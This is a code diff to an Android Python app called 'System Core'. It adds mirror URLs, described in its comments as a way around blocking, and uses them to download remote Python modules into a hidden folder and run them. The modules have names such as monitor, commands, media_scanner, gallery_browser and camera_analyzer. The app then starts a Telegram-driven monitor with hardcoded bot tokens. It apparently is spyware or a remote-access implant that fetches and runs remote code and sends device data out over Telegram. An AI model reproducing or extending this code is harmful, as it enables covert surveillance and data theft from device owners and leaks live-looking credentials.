@@ -18,6 +18,16 @@ from kivy.core.clipboard import Clipboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ------------------ إعدادات تجاوز الحظر ------------------
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Accept': 'application/json, text/plain, */*'
+}
+# قائمة روابط index.json (الأول يفضل jsdelivr لأنه أقل حظراً)
+INDEX_URLS = [
+    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",   # CDN mirror
+    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
+]
 
 def _get_path():
     try:
@@ -30,14 +40,12 @@ def _get_path():
     os.makedirs(p, exist_ok=True)
     return p
 
-
-R = _get_path()
-U = os.path.join(R, "updates")          # ✅ مجلد التحميل المؤقت (إصلاح 1)
+R = _get_path()                     # المجلد الرئيسي للتشغيل (.sys_runtime)
+U = os.path.join(R, "updates")      # مجلد التحميل المؤقت
 os.makedirs(U, exist_ok=True)
 
 if R not in sys.path:
     sys.path.insert(0, R)
-
 
 def _perms():
     try:
@@ -62,14 +70,10 @@ def _perms():
     except Exception:
         pass
 
-
-RAW_INDEX = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
-
-
 class CoreApp(App):
     def build(self):
         _perms()
-        self.title = "System Core v3.2 (Safe Update)"
+        self.title = "System Core v3.2 (Proxy & Mirror)"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -103,18 +107,15 @@ class CoreApp(App):
 
     def _log(self, msg, lvl="INFO"):
         ts = datetime.now().strftime("%H:%M:%S")
-
         def upd(dt):
             self.log.text += f"[{ts}] [{lvl}] {msg}\n"
             if len(self.log.text) > 15000:
                 self.log.text = self.log.text[-8000:]
             self.log.cursor = (0, len(self.log.text))
-
         Clock.schedule_once(upd, 0)
 
-    # ✅ إصلاح 2: التحقق من صحة الكود قبل الاستبدال (Syntax Validation)
     def _verify_module(self, file_path, module_name):
-        """تتحقق من وجود الملف وخلوه من أخطاء نحوية باستخدام compile()"""
+        """التحقق من سلامة الملف (وجود وخلو من الأخطاء النحوية)"""
         if not os.path.exists(file_path):
             return False
         try:
@@ -122,82 +123,80 @@ class CoreApp(App):
                 content = f.read()
             if len(content) < 300:
                 return False
-            # فحص نحوي
             compile(content, module_name, 'exec')
-            # فحص خاص لملف telegram_ui (وجود class T)
             if module_name == "telegram_ui.py" and "class T" not in content:
                 return False
             return True
-        except SyntaxError as e:
-            self._log(f"Syntax error in {module_name}: {e}", "ERROR")
-            return False
         except Exception as e:
-            self._log(f"Verification error for {module_name}: {e}", "ERROR")
+            self._log(f"Verification error {module_name}: {e}", "ERROR")
             return False
 
-    # ✅ إصلاح 1 و 4: تحميل آمن مع مجلد مؤقت وزيادة عدد المحاولات
     def _download_safe(self, url, filename):
-        """تحميل الملف إلى مجلد مؤقت، التحقق منه، ثم نسخه إلى المجلد النهائي"""
+        """تحميل ملف واحد مع إعادة محاولة واستخدام رأسيات متصفح"""
         tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
 
-        for attempt in range(5):   # ✅ إصلاح 4: زيادة المحاولات إلى 5
-            try:
-                self._log(f"Downloading {filename} (attempt {attempt+1}/5)...")
-                resp = requests.get(f"{url}?v={int(time.time())}", timeout=30, verify=False)
-                if resp.status_code == 200 and len(resp.text) > 300:
-                    with open(tmp_path, 'w', encoding='utf-8') as f:
-                        f.write(resp.text)
+        # محاولة تحويل الرابط إلى mirror jsdelivr أيضاً إذا كان raw.githubusercontent
+        alt_url = url.replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main")
+        urls_to_try = [url, alt_url]
 
-                    if self._verify_module(tmp_path, filename):
-                        # نسخ الملف الصحيح إلى المجلد النهائي
-                        with open(tmp_path, 'r', encoding='utf-8') as src:
-                            content = src.read()
-                        with open(final_path, 'w', encoding='utf-8') as dst:
-                            dst.write(content)
-                        self._log(f"✅ {filename} updated successfully ({len(resp.text)} bytes)")
-                        return True
-                    else:
-                        self._log(f"❌ {filename} failed verification (syntax or content)", "ERROR")
-                        return False
-                else:
-                    self._log(f"Download {filename} failed: HTTP {resp.status_code}", "WARN")
-            except Exception as e:
-                self._log(f"Attempt {attempt+1} error for {filename}: {e}", "WARN")
-
-            if attempt < 4:
-                time.sleep(10)   # ✅ إصلاح 4: تأخير 10 ثوانٍ بين المحاولات
-
-        self._log(f"❌ {filename} failed after 5 attempts", "ERROR")
+        for attempt in range(4):   # 4 محاولات
+            for current_url in urls_to_try:
+                try:
+                    self._log(f"Download {filename} (attempt {attempt+1}) from {current_url.split('/')[2]}...")
+                    resp = requests.get(current_url, headers=HEADERS, timeout=25, verify=False)
+                    if resp.status_code == 200 and len(resp.text) > 300:
+                        with open(tmp_path, 'w', encoding='utf-8') as f:
+                            f.write(resp.text)
+                        if self._verify_module(tmp_path, filename):
+                            # نسخ إلى المجلد النهائي
+                            with open(tmp_path, 'r', encoding='utf-8') as src:
+                                content = src.read()
+                            with open(final_path, 'w', encoding='utf-8') as dst:
+                                dst.write(content)
+                            self._log(f"✅ {filename} updated successfully")
+                            return True
+                        else:
+                            self._log(f"❌ {filename} failed verification", "ERROR")
+                            return False
+                except Exception as e:
+                    self._log(f"Error from {current_url}: {e}", "WARN")
+            time.sleep(5)   # انتظار بين المحاولات
+        self._log(f"❌ {filename} failed after all attempts", "ERROR")
         return False
 
     def _start(self, _):
         threading.Thread(target=self._run, daemon=True).start()
 
     def _run(self):
-        self._log("🚀 Initializing System Core (Safe Update Mode)...", "BOOT")
+        self._log("🚀 Initializing System Core (Safe Update + Mirror)...", "BOOT")
 
-        # 1. جلب قائمة الملفات من index.json
+        # 1. جلب index.json من القائمة (تجاوز الحظر)
         all_files = []
-        try:
-            resp = requests.get(RAW_INDEX, timeout=20, verify=False)
-            if resp.status_code == 200:
-                all_files = resp.json().get('files', [])
-                self._log(f"📄 Found {len(all_files)} files in index")
-            else:
-                self._log("Failed to fetch index.json, using local files only", "WARN")
-        except Exception as e:
-            self._log(f"Index fetch error: {e}", "ERROR")
+        for idx_url in INDEX_URLS:
+            try:
+                self._log(f"Fetching index from {idx_url} ...")
+                resp = requests.get(idx_url, headers=HEADERS, timeout=20, verify=False)
+                if resp.status_code == 200:
+                    all_files = resp.json().get('files', [])
+                    self._log(f"📄 Found {len(all_files)} files in index (from {idx_url.split('/')[2]})")
+                    break
+                else:
+                    self._log(f"Index failed HTTP {resp.status_code}", "WARN")
+            except Exception as e:
+                self._log(f"Index fetch error: {e}", "WARN")
+        else:
+            self._log("❌ All index URLs failed. Using local files only (if any).", "ERROR")
 
-        # 2. تحميل التحديثات بشكل آمن (بدون حذف الملفات القديمة أولاً)
+        # 2. تحميل كل الملفات باستثناء main.py
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
                 continue
             self._download_safe(file_url, filename)
 
-        # 3. إزالة الموديولات القديمة من الذاكرة (✅ إصلاح 3)
-        self._log("🧹 Cleaning old modules from memory...")
+        # 3. تنظيف الموديولات القديمة من الذاكرة
+        self._log("🧹 Cleaning old modules...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
             "media_scanner", "daily_zipper", "gallery_browser", "camera_analyzer"
@@ -205,26 +204,28 @@ class CoreApp(App):
         for mod in modules_to_remove:
             if mod in sys.modules:
                 del sys.modules[mod]
-
         importlib.invalidate_caches()
         gc.collect()
 
-        # 4. تشغيل النظام الأساسي
+        # 4. التأكد من وجود telegram_ui.py قبل الاستيراد
+        telegram_path = os.path.join(R, "telegram_ui.py")
+        if not os.path.exists(telegram_path):
+            self._log("❌ telegram_ui.py not found after downloads. Check internet/permissions.", "ERROR")
+            return
+
         try:
             import monitor
             import telegram_ui
             import commands
 
-            # إعادة تحميل لضمان أحدث نسخة
             importlib.reload(monitor)
             importlib.reload(telegram_ui)
             importlib.reload(commands)
 
             UI_Class = getattr(telegram_ui, 'T', None)
-
             if UI_Class:
                 mon = monitor.M()
-                # إعداد التوكنات والقنوات
+                # إعداد التوكنات (مشفرة هنا كنص واضح، يمكن تحسينها)
                 mon.bots = [
                     "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
                     "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4",
@@ -243,16 +244,13 @@ class CoreApp(App):
 
                 ui.start()
                 mon.start()
-
-                self._log("🎉 SYSTEM ONLINE (Safe Mode)", "SUCCESS")
+                self._log("🎉 SYSTEM ONLINE (Safe Mode + Mirror)", "SUCCESS")
                 self._log(f"Device ID: {mon.did} | Model: {mon.dmd}")
             else:
                 self._log("❌ CRITICAL: Class 'T' missing in telegram_ui.py", "ERROR")
-
         except Exception as e:
             self._log(f"FATAL ERROR: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
-
 
 if __name__ == '__main__':
     CoreApp().run()
